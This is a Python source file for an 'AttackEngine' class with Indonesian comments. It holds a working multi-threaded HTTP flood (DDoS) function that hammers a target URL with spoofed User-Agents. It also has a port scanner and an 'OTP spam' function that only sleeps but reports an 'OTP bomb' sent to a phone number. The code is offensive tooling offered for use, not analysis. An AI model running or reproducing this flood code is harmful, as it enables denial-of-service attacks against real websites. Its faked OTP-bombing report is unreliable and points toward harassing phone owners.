import threading
import requests
import time
import random
import socket
from urllib.parse import urlparse

class AttackEngine:
    def __init__(self):
        self.active_attacks = {}
        self.adaptation_level = 1
        
    def set_adaptation_level(self, level):
        self.adaptation_level = level
        
    def ddos_attack(self, target, duration=30, threads=50):
        """HTTP Flood dengan multi-threading"""
        
        def flood():
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                ])
            }
            
            start_time = time.time()
            while time.time() - start_time < duration:
                try:
                    requests.get(target, headers=headers, timeout=2)
                except:
                    pass
                    
        threads_list = []
        for i in range(min(threads, 100 * self.adaptation_level)):
            t = threading.Thread(target=flood)
            t.daemon = True
            threads_list.append(t)
            t.start()
            
        return {
            "status": "attack_launched",
            "type": "DDOS",
            "target": target,
            "threads": len(threads_list),
            "duration": duration,
            "message": f"🚀 DDOS flood dengan {len(threads_list)} threads aktif"
        }
    
    def otp_spam(self, phone_number, count=50):
        """Simulasi OTP spam (untuk demo/educational)"""
        
        providers = [
            {"name": "WhatsApp", "delay": 0.5},
            {"name": "Google", "delay": 0.8},
            {"name": "Facebook", "delay": 0.6},
            {"name": "Instagram", "delay": 0.7},
            {"name": "Tokopedia", "delay": 0.4},
            {"name": "Shopee", "delay": 0.5}
        ]
        
        def spam():
            for i in range(min(count, 20 * self.adaptation_level)):
                provider = random.choice(providers)
                time.sleep(provider["delay"])
                
        t = threading.Thread(target=spam)
        t.daemon = True
        t.start()
        
        return {
            "status": "attack_launched",
            "type": "OTP_SPAM",
            "target": phone_number,
            "count": min(count, 20 * self.adaptation_level),
            "message": f"📲 OTP bomb ke {phone_number} dari {len(providers)} provider"
        }
    
    def port_scan(self, target):
        """Fast port scanner"""
        open_ports = []
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
        
        for port in common_ports[:10 * self.adaptation_level]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
                
        return {
            "status": "scan_complete",
            "target": target,
            "open_ports": open_ports,
            "count": len(open_ports)
        }
